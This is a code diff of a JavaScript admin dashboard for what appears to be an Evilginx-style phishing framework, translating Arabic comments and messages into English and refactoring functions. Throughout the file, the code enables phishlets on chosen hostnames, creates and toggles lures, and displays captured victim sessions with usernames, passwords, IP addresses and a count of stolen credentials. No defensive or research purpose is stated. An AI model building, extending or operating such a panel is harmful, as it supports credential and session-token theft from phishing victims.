@@ -1,4 +1,4 @@
-// العناصر الرئيسية في واجهة المستخدم
+// Main UI elements
 const sidebar = document.querySelector('.sidebar');
 const content = document.querySelector('.content');
 const menuToggle = document.querySelector('.menu-toggle');
@@ -6,40 +6,41 @@ const navLinks = document.querySelectorAll('.sidebar-nav a');
 const tabContents = document.querySelectorAll('.tab-content');
 const logoutBtn = document.getElementById('logout-btn');
 
-// العناصر الخاصة بالتبويبات المختلفة
+// Tab-specific elements
 const phishletsTable = document.getElementById('phishlets-table');
 const luresTable = document.getElementById('lures-table');
 const sessionsTable = document.getElementById('sessions-table');
 const phishletsRefreshBtn = document.getElementById('refresh-phishlets');
 const luresRefreshBtn = document.getElementById('refresh-lures');
-const sessionsRefreshBtn = document.getElementById('refresh-sessions');
+const sessionsRefreshBtn = document.getElementById('sessions-refresh-btn');
 const createLureBtn = document.getElementById('create-lure-btn');
+const updateCertificatesBtn = document.getElementById('update-certificates-btn');
 const lastUpdatedSpan = document.querySelector('.last-updated');
 
-// إحصائيات الداشبورد
+// Dashboard statistics
 const phishletsCountElement = document.getElementById('phishlets-count');
 const luresCountElement = document.getElementById('lures-count');
 const sessionsCountElement = document.getElementById('sessions-count');
 const credentialsCountElement = document.getElementById('credentials-count');
 
-// عنوان API الأساسي
+// Base API URL
 const API_BASE_URL = window.location.origin + '/api';
 
-// متغيرات عامة
+// Global variables
 let authToken = localStorage.getItem('authToken');
 let phishlets = [];
 let lures = [];
 let sessions = [];
 let credentials = [];
 
-// التحقق من حالة تسجيل الدخول
+// Check login status
 function checkAuthentication() {
     if (!authToken) {
         window.location.href = '/login';
     }
 }
 
-// إضافة الهيدر الخاص بالمصادقة إلى طلبات API
+// Add authentication header to API requests
 function getHeaders() {
     return {
         'Authorization': authToken,
@@ -47,18 +48,18 @@ function getHeaders() {
     };
 }
 
-// دالة للتعامل مع الأخطاء
+// Error handling function
 function handleApiError(error) {
     console.error('API Error:', error);
     if (error.status === 401) {
-        // تسجيل الخروج إذا كانت المصادقة غير صالحة
+        // Logout if authentication is invalid
         localStorage.removeItem('authToken');
         window.location.href = '/login';
     }
-    showToast('خطأ', error.message || 'حدث خطأ أثناء الاتصال بالخادم', 'error');
+    showToast('Error', error.message || 'An error occurred while connecting to the server', 'error');
 }
 
-// دالة لتحديث الوقت
+// Function to update time
 function updateLastUpdated() {
     const now = new Date();
     const options = {
@@ -66,12 +67,12 @@ function updateLastUpdated() {
         minute: '2-digit',
         second: '2-digit'
     };
-    lastUpdatedSpan.textContent = now.toLocaleTimeString('ar-SA', options);
+    lastUpdatedSpan.textContent = now.toLocaleTimeString('en-US', options);
 }
 
-// إظهار رسالة تنبيه
+// Show toast notification
 function showToast(title, message, type = 'info') {
-    const toaster = document.querySelector('.toaster') || createToaster();
+    const toastContainer = document.getElementById('toast-container');
     const toast = document.createElement('div');
     toast.className = `toast toast-${type}`;
     
@@ -92,36 +93,28 @@ function showToast(title, message, type = 'info') {
         <button class="toast-close"><i class="fas fa-times"></i></button>
     `;
     
-    toaster.appendChild(toast);
+    toastContainer.appendChild(toast);
     
-    // إزالة التنبيه بعد 5 ثواني
+    // Remove notification after 5 seconds
     setTimeout(() => {
         toast.style.opacity = '0';
         setTimeout(() => {
-            toaster.removeChild(toast);
+            toastContainer.removeChild(toast);
         }, 300);
     }, 5000);
     
-    // زر إغلاق التنبيه
+    // Close button for notification
     toast.querySelector('.toast-close').addEventListener('click', () => {
         toast.style.opacity = '0';
         setTimeout(() => {
-            toaster.removeChild(toast);
+            toastContainer.removeChild(toast);
         }, 300);
     });
 }
 
-// إنشاء حاوية التنبيهات إذا لم تكن موجودة
-function createToaster() {
-    const toaster = document.createElement('div');
-    toaster.className = 'toaster';
-    document.body.appendChild(toaster);
-    return toaster;
-}
-
 // ================= API Calls =================
 
-// جلب قائمة الـ Phishlets
+// Fetch Phishlets list
 async function fetchPhishlets() {
     try {
         const response = await fetch(`${API_BASE_URL}/phishlets`, {
@@ -132,23 +125,23 @@ async function fetchPhishlets() {
         if (!response.ok) {
             throw {
                 status: response.status,
-                message: 'فشل في جلب قائمة الـ Phishlets'
+                message: 'Failed to fetch Phishlets'
             };
         }
         
         const result = await response.json();
-        // تجهيز البيانات بالتنسيق المناسب
+        // Prepare data in appropriate format
         phishlets = Array.isArray(result) ? result : (result.data || []);
-        console.log('تم استلام Phishlets:', phishlets);
+        console.log('Received Phishlets:', phishlets);
         return phishlets;
     } catch (error) {
-        console.error('خطأ في جلب Phishlets:', error);
+        console.error('Error fetching Phishlets:', error);
         handleApiError(error);
         return [];
     }
 }
 
-// جلب قائمة الـ Lures
+// Fetch Lures list
 async function fetchLures() {
     try {
         const response = await fetch(`${API_BASE_URL}/lures`, {
@@ -159,23 +152,23 @@ async function fetchLures() {
         if (!response.ok) {
             throw {
                 status: response.status,
-                message: 'فشل في جلب قائمة الـ Lures'
+                message: 'Failed to fetch Lures'
             };
         }
         
         const result = await response.json();
-        // تجهيز البيانات بالتنسيق المناسب
+        // Prepare data in appropriate format
         lures = Array.isArray(result) ? result : (result.data || []);
-        console.log('تم استلام Lures:', lures);
+        console.log('Received Lures:', lures);
         return lures;
     } catch (error) {
-        console.error('خطأ في جلب Lures:', error);
+        console.error('Error fetching Lures:', error);
         handleApiError(error);
         return [];
     }
 }
 
-// جلب قائمة الـ Sessions
+// Fetch Sessions list
 async function fetchSessions() {
     try {
         const response = await fetch(`${API_BASE_URL}/sessions`, {
@@ -186,87 +179,91 @@ async function fetchSessions() {
         if (!response.ok) {
             throw {
                 status: response.status,
-                message: 'فشل في جلب قائمة الـ Sessions'
+                message: 'Failed to fetch Sessions'
             };
         }
         
         const result = await response.json();
-        console.log('استجابة API الأصلية للجلسات:', result);
+        console.log('Original API response for sessions:', result);
         
-        // تجهيز البيانات بالتنسيق المناسب
-        // تحقق من تنسيق البيانات المستلمة وتحويلها إلى تنسيق موحد
+        // Prepare data in the appropriate format
+        // Check the format of the received data and convert it to a unified format
         sessions = [];
         
-        if (Array.isArray(result)) {
-            sessions = result;
-        } else if (result.data && Array.isArray(result.data)) {
-            sessions = result.data;
-        } else if (typeof result === 'object') {
-            // إذا كان الرد كائن يحتوي على جلسات
-            const possibleArrayKeys = ['sessions', 'data', 'records', 'items'];
-            for (const key of possibleArrayKeys) {
-                if (result[key] && Array.isArray(result[key])) {
-                    sessions = result[key];
-                    break;
-                }
-            }
-            
-            // إذا لم نجد مصفوفة، ربما البيانات مخزنة كقيم في الكائن
-            if (sessions.length === 0) {
-                const sessionIds = Object.keys(result);
-                sessions = sessionIds.map(id => {
-                    const session = result[id];
-                    if (typeof session === 'object') {
-                        session.id = id;
-                        return session;
+        if (sessions.length === 0) {
+            if (Array.isArray(result)) {
+                sessions = result;
+            } else if (result.data) {
+                sessions = result.data;
+            } else if (typeof result === 'object') {
+                // If the response is an object, it might contain sessions
+                const possibleArrayKeys = ['sessions', 'data', 'records', 'items'];
+                for (const key of possibleArrayKeys) {
+                    if (Array.isArray(result[key])) {
+                        sessions = result[key];
+                        break;
                     }
-                    return null;
-                }).filter(session => session !== null);
+                }
+                
+                // If we didn't find an array, the data might be stored as values in the object
+                if (sessions.length === 0) {
+                    const sessionIds = Object.keys(result);
+                    if (sessionIds.length > 0) {
+                        sessions = sessionIds.map(id => {
+                            const session = result[id];
+                            session.id = id;
+                            return session;
+                        });
+                    }
+                }
             }
         }
         
-        console.log('البيانات المعالجة للجلسات:', sessions);
+        console.log('Processed sessions data:', sessions);
         return sessions;
     } catch (error) {
-        console.error('خطأ في جلب Sessions:', error);
+        console.error('Error fetching Sessions:', error);
         handleApiError(error);
         return [];
     }
 }
 
-// تفعيل أو تعطيل الـ Phishlet
+// Enable or disable Phishlet
 async function togglePhishlet(name, enable) {
     try {
-        console.log(`محاولة ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet: ${name}`);
+        console.log(`Attempting to ${enable ? 'enable' : 'disable'} Phishlet: ${name}`);
         
-        // إذا كنا نحاول تفعيل، نتحقق أولاً مما إذا كان له hostname مضبوط
+        // If we're trying to enable, first check if it has a hostname
         if (enable) {
-            // الحصول على معلومات الـ phishlet
+            // Get phishlet information
             const phishletResponse = await fetch(`${API_BASE_URL}/phishlets/${name}`, {
                 method: 'GET',
                 headers: getHeaders()
             });
             
             if (!phishletResponse.ok) {
-                throw new Error(`فشل في الحصول على معلومات الـ Phishlet: ${phishletResponse.statusText}`);
+                throw new Error(`Failed to get information for Phishlet: ${phishletResponse.statusText}`);
             }
             
             const phishletData = await phishletResponse.json();
-            console.log(`بيانات الـ Phishlet ${name}:`, phishletData);
+            console.log(`Phishlet ${name} data:`, phishletData);
             
-            // التحقق مما إذا كان الـ phishlet يحتاج إلى hostname
+            // Check if the phishlet needs a hostname
             if (!phishletData.data.hostname || phishletData.data.hostname === "") {
-                // إظهار مربع حوار لطلب hostname
+                // Show prompt for requesting hostname
                 const hostname = await showHostnamePrompt(name);
                 if (!hostname) {
-                    // المستخدم ألغى العملية
+                    // User canceled the operation
                     return false;
                 }
                 
-                // تحديث hostname للـ phishlet
+                // Update hostname for the phishlet
                 const hostnameResponse = await fetch(`${API_BASE_URL}/configs/hostname`, {
                     method: 'POST',
-                    headers: getHeaders(),
+                    headers: {
+                        ...getHeaders(),
+                        'Content-Type': 'application/json'
+                    },
                     body: JSON.stringify({
                         phishlet: name,
                         hostname: hostname
@@ -274,130 +271,126 @@ async function togglePhishlet(name, enable) {
                 });
                 
                 if (!hostnameResponse.ok) {
-                    const errorText = await hostnameResponse.text();
-                    let errorMessage = hostnameResponse.statusText;
-                    
+                    let errorMessage = `Server error: ${hostnameResponse.status}`;
                     try {
-                        const errorData = JSON.parse(errorText);
-                        if (errorData.message) {
-                            errorMessage = errorData.message;
+                        const responseData = await hostnameResponse.json();
+                        if (responseData.message) {
+                            errorMessage = responseData.message;
                         }
                     } catch (e) {
-                        console.error("خطأ في تحليل استجابة الخطأ:", e);
+                        console.error("Error parsing error response:", e);
                     }
                     
-                    throw new Error(`فشل في تعيين hostname: ${errorMessage}`);
+                    throw new Error(`Failed to set hostname: ${errorMessage}`);
                 }
                 
-                console.log(`تم تعيين hostname بنجاح للـ phishlet ${name}`);
+                console.log(`Hostname set successfully for Phishlet ${name}`);
             }
         }
         
-        // الآن نقوم بتفعيل/تعطيل الـ phishlet
+        // Now we proceed to enable/disable the phishlet
         const action = enable ? 'enable' : 'disable';
         const response = await fetch(`${API_BASE_URL}/phishlets/${name}/${action}`, {
             method: 'POST',
             headers: getHeaders()
         });
         
-        // تسجيل الاستجابة كاملة للتصحيح
-        console.log(`استجابة ${action} للـ phishlet:`, response);
+        // Log full API response for debugging
+        console.log(`API response for ${action} Phishlet:`, response);
         
         if (!response.ok) {
-            const errorText = await response.text();
-            let errorMessage = response.statusText;
-            
+            let errorMessage = `Server error: ${response.status}`;
             try {
-                const errorData = JSON.parse(errorText);
+                const errorData = await response.json();
                 if (errorData.message) {
                     errorMessage = errorData.message;
                 }
             } catch (e) {
-                console.error("خطأ في تحليل استجابة الخطأ:", e);
+                console.error("Error parsing API error response:", e);
             }
             
-            throw new Error(`فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ phishlet: ${errorMessage}`);
+            throw new Error(`Failed to ${enable ? 'enable' : 'disable'} Phishlet: ${errorMessage}`);
         }
         
         const data = await response.json();
-        console.log(`بيانات استجابة ${action} للـ phishlet:`, data);
+        console.log(`Full API response for ${action} Phishlet:`, data);
         
         if (data.success) {
-            showToast('تم بنجاح', `تم ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet ${name} بنجاح`, 'success');
+            showToast('Success', `Successfully ${enable ? 'enabled' : 'disabled'} Phishlet ${name}`, 'success');
             
-            // التحقق مما إذا كانت الملفات قد تم حفظها
+            // Check if configurations were saved
             await checkConfigSaved();
             
             return true;
         } else {
-            showToast('خطأ', `فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet: ${data.message || 'خطأ غير معروف'}`, 'error');
+            showToast('Error', `Failed to ${enable ? 'enable' : 'disable'} Phishlet: ${data.message || 'Unknown error'}`, 'error');
             return false;
         }
     } catch (error) {
-        console.error(`خطأ في ${enable ? 'تفعيل' : 'تعطيل'} الـ Phishlet:`, error);
-        showToast('خطأ', `حدث خطأ: ${error.message}`, 'error');
+        console.error(`Error in ${enable ? 'enabling' : 'disabling'} Phishlet:`, error);
+        showToast('Error', `An error occurred: ${error.message}`, 'error');
         return false;
     }
 }
 
-// عرض مربع حوار لطلب hostname
+// Show prompt for requesting hostname
 async function showHostnamePrompt(phishletName) {
     return new Promise((resolve) => {
-        // إنشاء العناصر
+        // Create elements
         const modal = document.createElement('div');
         modal.className = 'modal active';
         modal.innerHTML = `
             <div class="modal-content">
                 <div class="modal-header">
-                    <h3>تعيين Hostname للـ Phishlet</h3>
+                    <h3>Set Hostname for Phishlet</h3>
                     <button class="modal-close">&times;</button>
                 </div>
                 <div class="modal-body">
-                    <p>يجب إدخال hostname لتفعيل الـ phishlet "${phishletName}"</p>
+                    <p>You must enter a hostname to enable the phishlet "${phishletName}"</p>
                     <div class="form-group">
                         <label for="hostname-input">Hostname</label>
                         <input type="text" id="hostname-input" class="form-control" placeholder="example.yourdomain.com">
                         <small class="form-text">
-                            أدخل النطاق الفرعي الذي سيستخدم للـ phishlet. 
-                            تأكد من أن هذا النطاق يشير إلى خادمك.
+                            Enter the subdomain that will be used for this phishlet. 
+                            Make sure this domain points to your server.
                         </small>
                     </div>
                 </div>
                 <div class="modal-footer">
-                    <button class="btn btn-secondary cancel-btn">إلغاء</button>
-                    <button class="btn btn-primary save-btn">حفظ</button>
+                    <button class="btn btn-secondary cancel-btn">Cancel</button>
+                    <button class="btn btn-primary save-btn">Save</button>
                 </div>
             </div>
         `;
         document.body.appendChild(modal);
         
-        // التركيز على حقل الإدخال
+        // Focus on input field
         const input = modal.querySelector('#hostname-input');
         setTimeout(() => input.focus(), 100);
         
-        // إضافة معالجات الأحداث
+        // Add event listeners
         const closeBtn = modal.querySelector('.modal-close');
         const cancelBtn = modal.querySelector('.cancel-btn');
         const saveBtn = modal.querySelector('.save-btn');
         
-        const close = (result) => {
+        function close(value = null) {
             document.body.removeChild(modal);
-            resolve(result);
-        };
+            resolve(value);
+        }
         
-        closeBtn.addEventListener('click', () => close(null));
-        cancelBtn.addEventListener('click', () => close(null));
+        closeBtn.addEventListener('click', () => close());
+        cancelBtn.addEventListener('click', () => close());
         
         saveBtn.addEventListener('click', () => {
             const hostname = input.value.trim();
             if (!hostname) {
-                showToast('خطأ', 'يرجى إدخال hostname صالح', 'error');
+                showToast('Error', 'Please enter a valid hostname', 'error');
                 return;
             }
             close(hostname);
         });
         
-        // معالجة ضغط Enter في حقل الإدخال
+        // Handle Enter key press in input field
         input.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') {
                 saveBtn.click();
@@ -406,67 +399,67 @@ async function showHostnamePrompt(phishletName) {
     });
 }
 
-// التحقق مما إذا كانت التغييرات قد تم حفظها
+// Check if changes were saved
 async function checkConfigSaved() {
     try {
-        // طلب لحفظ التكوين
+        // Request to save configuration
         const response = await fetch(`${API_BASE_URL}/config/save`, {
             method: 'POST',
             headers: getHeaders()
         });
         
         const data = await response.json();
-        console.log('استجابة حفظ التكوين:', data);
+        console.log('Configuration save response:', data);
         
         if (data.success) {
-            console.log('تم حفظ التكوين بنجاح');
+            console.log('Configuration saved successfully');
             return true;
         } else {
-            console.warn('فشل حفظ التكوين:', data.message);
+            console.warn('Failed to save configuration:', data.message);
             return false;
         }
     } catch (error) {
-        console.error('خطأ في حفظ التكوين:', error);
+        console.error('Error saving configuration:', error);
         return false;
     }
 }
 
-// عرض نافذة مودال لإدخال hostname
+// Show hostname modal
 function showHostnameModal(phishletName, callback) {
-    // إنشاء عناصر المودال
+    // Create modal elements
     const modal = document.createElement('div');
     modal.className = 'modal active';
     modal.innerHTML = `
         <div class="modal-content">
             <div class="modal-header">
-                <h3>إعداد Hostname للـ Phishlet</h3>
+                <h3>Set Hostname for Phishlet</h3>
                 <button class="modal-close">&times;</button>
             </div>
             <div class="modal-body">
-                <p>يجب إدخال hostname لتفعيل الـ phishlet "${phishletName}"</p>
+                <p>You must enter a hostname to enable the phishlet "${phishletName}"</p>
                 <div class="form-group">
                     <label for="phishlet-hostname">Hostname</label>
                     <input type="text" id="phishlet-hostname" class="form-control" placeholder="example.yourdomain.com">
                     <small class="form-text">
-                        أدخل اسم النطاق الكامل الذي سيستخدم لهذا الـ phishlet. 
-                        تأكد من أن هذا النطاق مسجل ويشير إلى خادمك.
+                        Enter the full domain name that will be used for this phishlet. 
+                        Make sure this domain is registered and points to your server.
                     </small>
                 </div>
             </div>
             <div class="modal-footer">
-                <button class="btn-secondary modal-cancel-btn">إلغاء</button>
-                <button class="btn-primary modal-save-btn">حفظ وتفعيل</button>
+                <button class="btn-secondary modal-cancel-btn">Cancel</button>
+                <button class="btn-primary modal-save-btn">Save and Enable</button>
             </div>
         </div>
     `;
     document.body.appendChild(modal);
     
-    // إضافة معالجات الأحداث
+    // Add event listeners
     const closeButtons = modal.querySelectorAll('.modal-close, .modal-cancel-btn');
     closeButtons.forEach(button => {
         button.addEventListener('click', function() {
             document.body.removeChild(modal);
-            callback(null); // إلغاء العملية
+            callback(null); // Cancel the operation
         });
     });
     
@@ -474,80 +467,84 @@ function showHostnameModal(phishletName, callback) {
     saveButton.addEventListener('click', function() {
         const hostname = modal.querySelector('#phishlet-hostname').value.trim();
         if (!hostname) {
-            showToast('خطأ', 'يجب إدخال hostname', 'error');
+            showToast('Error', 'Please enter a hostname', 'error');
             return;
         }
         document.body.removeChild(modal);
         callback(hostname);
     });
     
-    // التركيز على حقل الإدخال
+    // Focus on input field
     setTimeout(() => {
         modal.querySelector('#phishlet-hostname').focus();
     }, 100);
 }
 
-// إنشاء Lure جديد
+// Create new Lure
 async function createLure(lureData) {
     try {
         const response = await fetch(`${API_BASE_URL}/lures`, {
             method: 'POST',
-            headers: getHeaders(),
+            headers: {
+                ...getHeaders(),
+                'Content-Type': 'application/json'
+            },
             body: JSON.stringify(lureData)
         });
         
         if (!response.ok) {
             throw {
                 status: response.status,
-                message: 'فشل في إنشاء الـ Lure'
+                message: 'Failed to create Lure'
             };
         }
         
-        showToast('تم بنجاح', 'تم إنشاء Lure جديد بنجاح', 'success');
+        showToast('Success', 'Successfully created new Lure', 'success');
         return await response.json();
     } catch (error) {
+        console.error('Error creating Lure:', error);
         handleApiError(error);
         return null;
     }
 }
 
-// حذف Lure
+// Delete Lure
 async function deleteLure(id) {
     try {
-        console.log(`محاولة حذف Lure بالمعرف ${id}`);
+        console.log(`Attempting to delete Lure with ID ${id}`);
         
         const response = await fetch(`${API_BASE_URL}/lures/${id}`, {
             method: 'DELETE',
             headers: getHeaders()
         });
         
-        console.log('استجابة حذف Lure:', response);
+        console.log('Lure delete response:', response);
         
         if (!response.ok) {
             throw {
                 status: response.status,
-                message: 'فشل في حذف الـ Lure'
+                message: 'Failed to delete Lure'
             };
         }
         
-        // محاولة قراءة الاستجابة كـ JSON
+        // Attempt to read the response as JSON
         let responseData;
         try {
             responseData = await response.json();
-            console.log('بيانات استجابة حذف Lure:', responseData);
+            console.log('Lure delete response data:', responseData);
         } catch (e) {
-            console.log('لا يمكن قراءة استجابة الحذف كـ JSON', e);
+            console.log('Unable to read delete response as JSON', e);
         }
         
         return true;
     } catch (error) {
-        console.error('خطأ أثناء حذف Lure:', error);
+        console.error('Error in deleting Lure:', error);
         handleApiError(error);
         return false;
     }
 }
 
-// جلب تفاصيل Session
+// Fetch Session details
 async function fetchSessionDetails(id) {
     try {
         const response = await fetch(`${API_BASE_URL}/sessions/${id}`, {
@@ -558,29 +555,30 @@ async function fetchSessionDetails(id) {
         if (!response.ok) {
             throw {
                 status: response.status,
-                message: 'فشل في جلب تفاصيل الـ Session'
+                message: 'Failed to fetch Session details'
             };
         }
         
         const responseJson = await response.json();
-        console.log('استجابة تفاصيل الجلسة:', responseJson);
+        console.log('Session details response:', responseJson);
         
-        // استخراج البيانات من حقل Data في الاستجابة
+        // Extract data from Data field in the response
         if (responseJson.success && responseJson.data) {
             return responseJson.data;
+        } else {
+            return responseJson;
         }
-        
-        return null;
     } catch (error) {
+        console.error('Error fetching session details:', error);
         handleApiError(error);
         return null;
     }
 }
 
-// تفعيل أو تعطيل الـ Lure
+// Enable or disable Lure
 async function toggleLure(id, enable) {
     try {
-        console.log(`محاولة ${enable ? 'تفعيل' : 'تعطيل'} Lure بالمعرف ${id}`);
+        console.log(`Attempting to ${enable ? 'enable' : 'disable'} Lure with ID ${id}`);
         
         const action = enable ? 'enable' : 'disable';
         const response = await fetch(`${API_BASE_URL}/lures/${id}/${action}`, {
@@ -588,28 +586,28 @@ async function toggleLure(id, enable) {
             headers: getHeaders()
         });
         
-        console.log(`استجابة ${enable ? 'تفعيل' : 'تعطيل'} Lure:`, response);
+        console.log(`API response for ${enable ? 'enabling' : 'disabling'} Lure:`, response);
         
         if (!response.ok) {
             throw {
                 status: response.status,
-                message: `فشل في ${enable ? 'تفعيل' : 'تعطيل'} الـ Lure`
+                message: `Failed to ${enable ? 'enable' : 'disable'} Lure`
             };
         }
         
-        // محاولة قراءة الاستجابة كـ JSON
+        // Attempt to read the response as JSON
         let responseData;
         try {
             responseData = await response.json();
-            console.log(`بيانات استجابة ${enable ? 'تفعيل' : 'تعطيل'} Lure:`, responseData);
+            console.log(`API response for ${enable ? 'enabling' : 'disabling'} Lure:`, responseData);
         } catch (e) {
-            console.log('لا يمكن قراءة الاستجابة كـ JSON', e);
+            console.log('Unable to read API response as JSON', e);
         }
         
-        showToast('تم بنجاح', `تم ${enable ? 'تفعيل' : 'تعطيل'} الـ Lure بنجاح`, 'success');
+        showToast('Success', `Successfully ${enable ? 'enabled' : 'disabled'} Lure`, 'success');
         return true;
     } catch (error) {
-        console.error(`خطأ أثناء ${enable ? 'تفعيل' : 'تعطيل'} Lure:`, error);
+        console.error(`Error in ${enable ? 'enabling' : 'disabling'} Lure:`, error);
         handleApiError(error);
         return false;
     }
@@ -617,66 +615,65 @@ async function toggleLure(id, enable) {
 
 // ================= UI Functions =================
 
-// تحديث لوحة القيادة
+// Update dashboard
 async function updateDashboard() {
     try {
         updateLastUpdated();
         
-        // جلب البيانات من API
+        // Fetch data from API
         const [phishletsData, luresData, sessionsData] = await Promise.all([
             fetchPhishlets(),
             fetchLures(),
             fetchSessions()
         ]);
         
-        // تحديث الإحصائيات
+        // Update statistics
         phishletsCountElement.textContent = phishletsData.length;
         luresCountElement.textContent = luresData.length;
         sessionsCountElement.textContent = sessionsData.length;
         
-        // حساب عدد بيانات الاعتماد المسجلة
+        // Calculate logged in credentials count
         let credCount = 0;
         sessionsData.forEach(session => {
-            if (session.tokens && Object.keys(session.tokens).length > 0) {
+            if (session.username && session.password) {
                 credCount++;
             }
         });
         credentialsCountElement.textContent = credCount;
         
-        // تحديث جدول الجلسات الأخيرة
+        // Update recent sessions table
         const recentSessionsTable = document.getElementById('recent-sessions-table');
         if (recentSessionsTable) {
             populateRecentSessionsTable(recentSessionsTable, sessionsData.slice(0, 5));
         }
-        
     } catch (error) {
         console.error('Error updating dashboard:', error);
-        showToast('خطأ', 'فشل في تحديث لوحة القيادة', 'error');
+        showToast('Error', 'Failed to update dashboard', 'error');
     }
 }
 
-// تعبئة جدول الجلسات الأخيرة
+// Populate recent sessions table
 function populateRecentSessionsTable(tableElement, sessions) {
     const tbody = tableElement.querySelector('tbody');
     tbody.innerHTML = '';
     
     if (!sessions || sessions.length === 0) {
         const tr = document.createElement('tr');
-        tr.innerHTML = `<td colspan="5" class="text-center">لا توجد جلسات مسجلة</td>`;
+        tr.innerHTML = `<td colspan="5" class="text-center">No logged sessions</td>`;
         tbody.appendChild(tr);
         return;
     }
     
     sessions.forEach(session => {
-        // التأكد من وجود كافة البيانات الضرورية
-        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'غير معروف';
+        // Ensure all required data is present
+        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'Unknown';
         const phishlet = session.phishlet || session.Phishlet || '';
-        const username = session.username || session.Username || session.user || session.User || session.login || 'غير مسجل';
-        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'غير معروف';
+        const username = session.username || session.Username || session.user || session.User || session.login || 'Not logged in';
+        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'Unknown';
         
-        // محاولة العثور على وقت الإنشاء، قد يكون في عدة حقول مختلفة
+        // Attempt to find creation time, it might be in multiple fields
         let created = null;
-        if (session.create_time) created = session.create_time * 1000; // تحويل من ثواني إلى مللي ثانية
+        if (session.create_time) created = session.create_time * 1000; // Convert from seconds to milliseconds
         else if (session.CreateTime) created = session.CreateTime * 1000;
         else if (session.created) created = session.created;
         else if (session.timestamp) created = session.timestamp;
@@ -694,46 +691,46 @@ function populateRecentSessionsTable(tableElement, sessions) {
     });
 }
 
-// تعبئة جدول الـ Phishlets
+// Populate Phishlets table
 function populatePhishletsTable(phishlets) {
     const tbody = phishletsTable.querySelector('tbody');
     tbody.innerHTML = '';
     
     if (!phishlets || phishlets.length === 0) {
         const tr = document.createElement('tr');
-        tr.innerHTML = `<td colspan="5" class="text-center">لا توجد phishlets</td>`;
+        tr.innerHTML = `<td colspan="5" class="text-center">No phishlets</td>`;
         tbody.appendChild(tr);
         return;
     }
     
-    console.log('بيانات الـ Phishlets المستلمة:', phishlets);
+    console.log('Received Phishlets data:', phishlets);
     
     phishlets.forEach(phishlet => {
         const tr = document.createElement('tr');
-        // تأكد من أن جميع الخصائص المطلوبة موجودة
+        // Ensure all required properties are present
         const name = phishlet.name || phishlet.id || '';
         const author = phishlet.author || '';
         const hostname = phishlet.hostname || '';
         
-        // التحقق من حالة التفعيل - يمكن أن تكون في أي من هذه الحقول
+        // Check activation status - it might be in any of these fields
         const enabled = phishlet.is_active === true || phishlet.isActive === true || phishlet.IsActive === true || phishlet.enabled === true;
         
         tr.innerHTML = `
             <td>${name}</td>
             <td>${author}</td>
-            <td>${hostname || 'غير محدد'}</td>
-            <td><span class="badge ${enabled ? 'badge-success' : 'badge-danger'}">${enabled ? 'مفعل' : 'معطل'}</span></td>
+            <td>${hostname || 'Not specified'}</td>
+            <td><span class="badge ${enabled ? 'badge-success' : 'badge-danger'}">${enabled ? 'Enabled' : 'Disabled'}</span></td>
             <td class="action-buttons">
                 <button class="btn btn-sm ${enabled ? 'btn-danger' : 'btn-success'}" data-action="${enabled ? 'disable' : 'enable'}" data-name="${name}">
                     <i class="fas fa-${enabled ? 'power-off' : 'play'}"></i>
-                    ${enabled ? 'تعطيل' : 'تفعيل'}
+                    ${enabled ? 'Disable' : 'Enable'}
                 </button>
             </td>
         `;
         tbody.appendChild(tr);
     });
     
-    // إضافة معالجات الأحداث لأزرار التفعيل/التعطيل
+    // Add event listeners for enable/disable buttons
     const actionButtons = tbody.querySelectorAll('[data-action]');
     actionButtons.forEach(button => {
         button.addEventListener('click', async function() {
@@ -741,41 +738,43 @@ function populatePhishletsTable(phishlets) {
             const action = this.dataset.action;
             
             if (action === 'enable') {
-                await togglePhishlet(name, true);
-            } else {
-                await togglePhishlet(name, false);
+                const success = await togglePhishlet(name, true);
+                if (!success) return;
+            } else if (action === 'disable') {
+                const success = await togglePhishlet(name, false);
+                if (!success) return;
             }
             
-            // تحديث جدول الـ Phishlets
+            // Update Phishlets table
             const updatedPhishlets = await fetchPhishlets();
             populatePhishletsTable(updatedPhishlets);
         });
     });
 }
 
-// تعبئة جدول الـ Lures
+// Populate Lures table
 function populateLuresTable(lures) {
     const tbody = luresTable.querySelector('tbody');
     tbody.innerHTML = '';
     
     if (!lures || lures.length === 0) {
         const tr = document.createElement('tr');
-        tr.innerHTML = `<td colspan="6" class="text-center">لا توجد lures</td>`;
+        tr.innerHTML = `<td colspan="6" class="text-center">No lures</td>`;
         tbody.appendChild(tr);
         return;
     }
     
-    console.log('بيانات الـ Lures الكاملة:', lures);
+    console.log('Full Lures data:', lures);
     
     lures.forEach((lure, index) => {
-        // التأكد من وجود كافة البيانات الضرورية
+        // Ensure all required data is present
         const id = lure.id || index;
         const phishlet = lure.phishlet || '';
         const hostname = lure.hostname || '';
         const path = lure.path || '/';
         const redirectUrl = lure.redirect_url || lure.RedirectUrl || '';
         
-        // التحقق مما إذا كان الـ lure مفعّلًا أو معطّلًا
+        // Check if the lure is enabled or disabled
         const isEnabled = !lure.PausedUntil || lure.PausedUntil === 0 || lure.PausedUntil < Date.now()/1000;
         
         const tr = document.createElement('tr');
@@ -787,23 +786,23 @@ function populateLuresTable(lures) {
             <td>${redirectUrl}</td>
             <td>
                 <span class="badge ${isEnabled ? 'badge-success' : 'badge-danger'}">
-                    ${isEnabled ? 'مفعّل' : 'معطّل'}
+                    ${isEnabled ? 'Enabled' : 'Disabled'}
                 </span>
             </td>
             <td class="action-buttons">
                 <button class="btn btn-sm ${isEnabled ? 'btn-danger' : 'btn-success'} toggle-lure-btn" data-index="${index}" data-action="${isEnabled ? 'disable' : 'enable'}">
                     <i class="fas fa-${isEnabled ? 'power-off' : 'play'}"></i>
-                    ${isEnabled ? 'تعطيل' : 'تفعيل'}
+                    ${isEnabled ? 'Disable' : 'Enable'}
                 </button>
                 <button class="btn btn-sm btn-danger delete-lure-btn" data-index="${index}">
-                    <i class="fas fa-trash-alt"></i> حذف
+                    <i class="fas fa-trash-alt"></i> Delete
                 </button>
             </td>
         `;
         tbody.appendChild(tr);
     });
     
-    // إضافة معالجات الأحداث لأزرار التفعيل/التعطيل
+    // Add event listeners for enable/disable buttons
     const toggleButtons = tbody.querySelectorAll('.toggle-lure-btn');
     toggleButtons.forEach(button => {
